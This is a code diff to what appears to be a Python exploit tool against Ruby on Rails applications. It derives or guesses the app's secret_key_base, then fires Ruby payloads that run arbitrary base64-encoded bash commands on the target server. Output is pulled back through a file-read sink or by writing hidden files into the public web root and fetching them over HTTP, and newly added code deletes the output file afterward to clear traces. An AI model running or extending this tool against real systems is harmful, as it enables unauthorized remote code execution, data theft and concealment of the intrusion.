@@ -488,7 +488,10 @@ def resolve_secret_key_base(dt, recon, args):
                 info(f"credentials decryption failed ({e})")
 
     if args.dev_md5:
-        recon.app_names.insert(0, args.dev_md5)
+        # Accept either the short app class ("MyApp") or the full constant
+        # ("MyApp::Application"); the dev key is MD5("<AppClass>::Application").
+        forced = args.dev_md5 if "::" in args.dev_md5 else args.dev_md5 + "::Application"
+        recon.app_names.insert(0, forced)
     candidates = []
     for name in recon.app_names:
         if name not in candidates:
@@ -528,6 +531,8 @@ def run(dt, recon, skb, command, args):
         ruby = f"system('bash','-c','echo {b64}|base64 -d|bash > {target_file} 2>&1')"
         fire_payload(dt, skb, ruby, args.classic)
         out = recon.read_file(target_file.lstrip("/"))
+        if not args.no_cleanup:
+            fire_payload(dt, skb, f"system('bash','-c','rm -f {target_file}')", args.classic)
         return out.decode("utf-8", "replace") if out else None
 
     root = recon.app_root
@@ -536,13 +541,13 @@ def run(dt, recon, skb, command, args):
         return None
 
     info("mode: web-root exfil (write to public/, fetch over HTTP)")
-    for public in (f"{root}/public", f"{root}/public/assets"):
+    for public, prefix in ((f"{root}/public", ""), (f"{root}/public/assets", "/assets")):
         name = "." + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
         web_asset = f"{public}/{name}"
         ruby = f"system('bash','-c','echo {b64}|base64 -d|bash > {web_asset} 2>&1')"
         fire_payload(dt, skb, ruby, args.classic)
         try:
-            r = dt.get(f"/{name}")
+            r = dt.get(f"{prefix}/{name}")
         except requests.RequestException:
             r = None
         if r is not None and r.status_code == 200:
@@ -562,7 +567,8 @@ def main():
     ap.add_argument("-c", "--command", default="id", help="command to run on the target")
     ap.add_argument("--secret-key-base", default=None, help="skip secret derivation")
     ap.add_argument("--dev-md5", default=None, metavar="APPCLASS",
-                    help="force MD5(APPCLASS ::Application) as the dev secret_key_base")
+                    help="force MD5('<APPCLASS>::Application') as the dev secret_key_base "
+                         "(APPCLASS may be short, e.g. MyApp, or the full constant)")
     ap.add_argument("--resource", default=None, help="force the render-file sink path")
     ap.add_argument("--proxy", default=None, help="e.g. http://127.0.0.1:8080")
     ap.add_argument("--classic", action="store_true", help="use the ERB#result gadget")
